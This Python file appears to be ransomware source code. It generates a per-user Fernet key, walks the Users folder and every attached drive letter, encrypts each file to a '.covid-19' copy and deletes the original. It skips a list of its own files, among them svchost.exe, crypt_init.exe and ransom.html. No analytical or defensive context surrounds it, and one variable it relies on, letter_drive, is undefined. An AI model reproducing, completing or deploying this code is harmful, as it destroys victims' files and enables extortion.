#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
import os

# GET THE ENVIRONMENT VARIABLE
current_user = os.environ["USERNAME"]
usrkey = "{}.key".format(current_user)

# GENERATE KEY FUNCTION
def genkey(name):
    global key
    key = Fernet.generate_key()
    with open(usrkey, "wb") as file:
        file.write(key)
        
# FILE ENCYPTING FUNCTION
def file_encrypt(key, name):
    with open(name,'rb') as files:
        data = files.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    encrypted_file = name + ".covid-19"
    try:
        with open(encrypted_file, 'wb') as files:
            files.write(encrypted)

        os.remove(name)
    except:
        pass
    
# LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
def filelist():
    rep = ['\\Users\\']
    for user in rep:
        for root, dirs, files in os.walk(user):
            for file in files:
                my_files = ["GuiCounter.exe", "svchost.exe", "image.jpg", "windows-installer.ico", \
                "crypt_init.exe", "vcruntime140.dll", "python37.dll", "python3.dll", "ransom.html", \
                "tk86t.dll", "tcl86t.dll", "library.zip", "tclIndex" ]
                if not(file in my_files):
                    for ext in file.split("."):
                        if(file.endswith(ext)):
                            my_ext = ["pyc", "pyd", "tcl", "h", "msg", "enc", "covid-19"]
                            if not(ext in my_ext):
                                try:
                                    full_path = os.path.join(root, file)
                                    file_encrypt(key, full_path)
                                except PermissionError:
                                    pass
                                except:
                                    pass
                                
# ADD ALL LETTER FOR POSSIBLE DRIVES
all_drives = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
drives     = []

# FUNCTION TO ENCRYPT ALL DRIVES CONNECTED ON THE SYSTEM
def drives_aux():
    # GET THE LETTER OF EVERY DISK INTO THE SYSTEM
    for letter in all_drives:
        if os.path.isdir(letter + ':\\'):
            drives.append(letter + ":")
    # ADD PATH TO ENCRYPT OF EVERY DISK INTO THE SYSTEM
    for drive in drives:
        rep = ["{}\\Users\\".format(drive)]
        if drive != letter_drive:
            rep.append(drive + "\\")
            for letter in rep:
                for root, dir, files in os.walk(letter):
                    for file in files:
                        for ext in file.split("."):
                            if file.endswith(ext):
                                my_ext = ["covid-19"]
                                if not(ext in my_ext):
                                    try:
                                        full_path = os.path.join(root, file)
                                        file_encrypt(key, full_path)
                                    except PermissionError:
                                        pass
                                    except:
                                        pass
